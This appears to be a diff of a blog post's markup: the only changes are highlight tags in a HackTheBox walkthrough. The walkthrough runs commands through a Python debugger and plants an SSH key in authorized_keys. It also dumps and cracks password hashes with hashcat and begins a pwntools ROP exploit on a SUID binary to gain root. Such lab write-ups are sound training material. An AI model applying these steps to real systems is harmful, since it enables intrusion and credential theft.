@@ -30,7 +30,7 @@ Nmap done: 1 IP address (1 host up) scanned in 16.92 seconds
 
 Once I was able to identify what services were running, I hopped on over to the website and began to poke around while running gobuster. When I got to the /articles/ directory, I noticed the numbers incremented and so I manually "fuzzed". I did this by simply adding iterations of numbers after the /articles/ directory, until I got to 5. Once on http://10.10.10.139/articles/5 I was able to find python debugger shells.
 
-{% highlight bash lineos %}
+{% highlight bash linenos %}
 File "/opt/corp-web/run.py", line 32, in show_articles
 slug = articles[index-1]
 
@@ -41,7 +41,7 @@ hal
 
 Nice! I found I have the ability to run os system commands. During initial enumeration, I found that there is Port 22 open. First, I tried to steal the SSH key, but I did not know the key passphrase so connection was refused. However, looking further, I can write to the authorized_keys file. So, I generated a new SSH RSA key, and placed my pub key in authorized_keys:
 
-{% highlight bash lineos %}
+{% highlight bash linenos %}
 import os
 
 os.system("echo '\nssh-rsa [your RSA key]' >> /home/hal/.ssh/authorized_keys")
@@ -51,7 +51,7 @@ And now I can login to SSH. Awesome, initial foothold gained!
 
 Now that we have SSH, completing further enumeration I found I was user Hal, and needed to escelate to user. Enumerating the system, there is a backup folder in /var/. In there, I have read permissions to shadow.bak!? Bad admin!
 
-{% highlight bash lineos %}
+{% highlight bash linenos %}
 cat /var/backups/shadow.bak
 
 root:*:17737:0:99999:7:::
@@ -91,7 +91,7 @@ duke:$6$bFjry0BT$OtPFpMfL/KuUZOafZalqHINNX/acVeIDiXXCPo9dPi1YHOp9AAAAnFTfEh.2Ahe
 
 Let’s crack those hashes!
 
-{% highlight bash %}
+{% highlight bash linenos %}
 hashcat64.exe -m 1800 -a 0 ellingsin.txt rockyou.txt --force
 
 theplague:password123
@@ -100,7 +100,7 @@ margo:iamgod$08
 
 Now that it’s cracked, let’s login as user!
 
-{% highlight bash %}
+{% highlight bash linenos %}
 su margo
 
 cat /home/margo/user.txt
@@ -109,7 +109,7 @@ d0ff9e3f9da8--------------------
 
 User owned. From here, I ran the linenum.sh script, and found a binary running that should NOT be there:
 
-{% highlight bash %}
+{% highlight bash linenos %}
 find / -perm -u=s -type f 2>/dev/null
 
 /usr/bin/garbage
@@ -117,7 +117,7 @@ find / -perm -u=s -type f 2>/dev/null
 
 I tried several methods to get the binary to my box. All ways failed, so assume that it's blocked on the box. I found openssl base64 as an alternative method.
 
-{% highlight bash %}
+{% highlight bash linenos %}
 openssl base64 < garbage
 
 //Copy output of encoded garbage
@@ -129,7 +129,7 @@ openssl base64 -d < garbage.input > garbage.output
 
 Garbage.output is now the binary on my system. For the ROP, I had to watch Bitterman's video several times, and speak wth the HTB community on Discord (if you are NOT on their channel, I highly recommend it. There is a community of hackers who really do want to help you along with nudges when you are stuck, which is especially nice for a n00b like me). After watching the second half of the video, and chatting with a few fellow hackers, I was able to come up with the following:
 
-{% highlight bash %}
+{% highlight bash linenos %}
 from pwn import *
 
 context(terminal=['tmux', 'new-window'])
@@ -180,7 +180,7 @@ p.interactive()
 
 Now, once I ran the binary, I was delivered root!
 
-{% highlight bash %}
+{% highlight bash linenos %}
 cat /root/root.txt
 1cc73a448021--------------------
 {% endhighlight %}
